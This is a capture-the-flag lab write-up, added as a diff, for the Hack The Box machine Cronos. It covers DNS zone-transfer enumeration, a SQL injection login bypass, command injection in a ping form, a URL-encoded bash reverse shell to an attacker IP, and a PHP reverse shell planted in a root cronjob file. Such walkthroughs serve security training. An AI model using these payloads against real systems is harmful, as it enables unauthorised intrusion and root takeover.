@@ -1,0 +1,92 @@
+HTB-CronOS-Writeup
+
+ip : 10.10.10.13
+
+Nmap
+----
+- nmap revealed that we have 3 ports open
+	22 running SSH
+	53 running DNS
+	80 running HTTP Apache
+
+Enumeration
+-----------
+- since port 53 is open we can start by enumerating DNS
+- we use nslookup and try to resolve the cronos ip
+	 
+	nslookup
+	server 10.10.10.13 
+
+- we get a domain name out of this 
+
+	ns1.cronos.htb
+
+- now we know a domain name and a base domain name which is cronos.htb
+- now we try dig dommand on the base domain name we found 
+
+	dig axfr cronos.htb @10.10.10.13
+
+- we got 2 more sub domains 
+	admin
+	www
+
+- we can add all this to our /etc/hosts file
+- we can run a subdomain bruteforce against the domain but we didnt find anything new 
+- on visiting port 80 we see a default apache page 
+- running directory bruteforce against it didnt yield any result 
+- visiting both cronos.htb and www.cronos.htb leads to a common page which is out of scope of the box 
+- visiting admin.cronos.htb gave us a login page 
+- tried few default username password combinations but didnt work
+- trying sql injection against the login form and it worked 
+
+	' or 1=1-- -
+
+- we are in and now we have a form which executes our ping requests
+- we can use this to ping an ip and the result will be printed on the screen
+- we try to execute other commands besides ip addresses and it worked
+- looks like the page suffers from command execution vulnerability
+
+	command=ls -l&host=/var/www
+
+- when we execute the above command through the form we get the result 
+- we can simply run a single command with the command parameter too
+
+	command=whoami
+
+- we use burpsuite to understand this more carefully
+
+Shell as www-data
+-----------------
+- we can try intercept the request with burp and send it to repeater 
+- we can now add a url encoded bash reverse shell to the command parameter and send the request
+
+	command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.24/9001+0>%261'%26host=
+
+- setup a netcat listener to catch the reverse shell
+
+	nc -nlvp 9001
+
+- we now have a shell as www-data 
+- grab the user flag
+
+Priv-esc
+--------
+- we can enumerate for possible privilege escalation vectors using linpeas
+- start a python server a get linpeas on the target machine 
+- running linpeas we found that the cronjob is running the following command as root every minute
+
+	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+- checking the file as www-data we have write permission on this file 
+- we can open the artisan file and add a reverse shell at the top
+
+	$sock=fsockopen("10.10.14.24", 443);
+	exec("/bin/sh -i <&3 >&3 2>&3");
+
+- start a listener with netcat 
+	
+	nc -nlvp 443
+
+- next time when the cronjob runs this file we will get a shell as root 
+- grab the root flag
+-    
